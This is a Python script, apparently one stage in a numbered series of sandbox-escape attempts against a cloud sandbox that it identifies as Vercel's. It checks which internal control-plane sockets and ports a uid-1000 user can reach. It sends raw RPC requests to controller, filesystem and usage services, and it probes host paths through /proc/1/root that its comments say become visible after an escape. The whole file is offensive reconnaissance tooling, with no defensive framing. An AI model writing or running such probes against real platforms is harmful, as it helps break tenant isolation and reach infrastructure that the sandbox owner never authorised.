# -*- coding: utf-8 -*-
"""v186 阶段A: 沙箱用户视角 (无逃逸, uid 1000) 控制面可达性"""
import socket, json

def tcp(ip, port, path, body, t=3):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((ip, port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(4096)
                if not c:
                    break
                d += c
                if len(d) > 1000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:800]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''

def unix(sp, path, body, t=3):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sp)
        hdrs = 'POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(4096)
                if not c:
                    break
                d += c
                if len(d) > 1000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:800]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''

print('USER_UID_START', flush=True)
# 1. 沙箱内能看到什么 socket 文件
import os
for p in ['/run/cell/cell.sock', '/run/vercel/share/init.sock', '/run/vercel/share', '/run/cell',
          '/var/run/containerd/containerd.sock', '/run/apm/apm.sock']:
    try:
        st = os.stat(p)
        print('STAT', p, oct(st.st_mode), st.st_uid, st.st_gid, flush=True)
    except Exception as e:
        print('STAT', p, 'EXC', e, flush=True)

# 2. TCP 端口可达性
CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'
FS = 'vercel.sandbox.api.controller.v1.FileSystemService'
USAGE = 'vercel.hive.cell.api.usage.v1.UsageService'
for ip, port in [('127.0.0.1', 23456), ('127.0.0.1', 26661), ('127.0.0.1', 8080)]:
    st, pay = tcp(ip, port, '/' + CTRL + '/Configure', {})
    print('TCP', ip, port, '->', st, pay[:300], flush=True)
    st, pay = tcp(ip, port, '/' + FS + '/Read', {'path': '/etc/hostname'})
    print('TCP', ip, port, 'FSRead ->', st, pay[:300], flush=True)

# 3. Unix socket 可达性 (沙箱视角路径)
for sp in ['/run/vercel/share/init.sock', '/run/cell/cell.sock']:
    try:
        st, pay = unix(sp, '/' + USAGE + '/GetResourceUsage', {})
        print('UNIX', sp, '->', st, pay[:300], flush=True)
    except Exception as e:
        print('UNIX', sp, 'EXC', type(e).__name__, flush=True)

# 4. 宿主视角路径 (逃逸后才可见)
for sp in ['/proc/1/root/run/cell/cell.sock', '/proc/1/root/volumes/run/vercel/share/init.sock']:
    try:
        st, pay = unix(sp, '/' + USAGE + '/GetResourceUsage', {})
        print('UNIX', sp, '->', st, pay[:300], flush=True)
    except Exception as e:
        print('UNIX', sp, 'EXC', type(e).__name__, flush=True)

print('USER_UID_DONE', flush=True)
